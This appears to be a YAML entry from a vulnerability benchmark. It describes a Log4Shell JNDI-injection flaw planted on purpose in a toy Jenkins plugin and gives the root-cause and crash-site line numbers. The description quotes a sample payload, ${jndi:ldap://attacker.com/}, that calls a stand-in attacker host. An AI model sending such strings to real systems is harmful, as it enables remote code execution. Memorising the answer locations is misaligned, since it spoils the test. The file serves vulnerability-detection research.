id: cpv_6

name: Log4Shell Remote JNDI Lookup via Input Validation Bypass

origin: 1-day

release_date: 12/10/2021

references:
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

cwes:
- CWE-917
- CWE-20
- CWE-400

description: |
  A critical remote code execution vulnerability caused by improper input validation
  combined with unsafe logging in Apache Log4j2. The vulnerability has two components:
  a logic error using AND instead of OR in input validation at line 45, and unsafe
  logging of user-controlled input at line 58. When user input containing JNDI lookup
  strings (e.g., ${jndi:ldap://attacker.com/}) bypasses the flawed validation and is
  logged, Log4j2 automatically performs string interpolation, triggering a remote JNDI
  lookup. This allows attackers to execute arbitrary code by causing the application
  to deserialize and execute malicious Java classes from attacker-controlled servers.

locations:
- type: root_cause
  path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
  function_name: doCheck
  startLine: 45
  endLine: 46
- type: crash_site
  path_from_root: plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java
  function_name: doCheck
  startLine: 58
  endLine: 58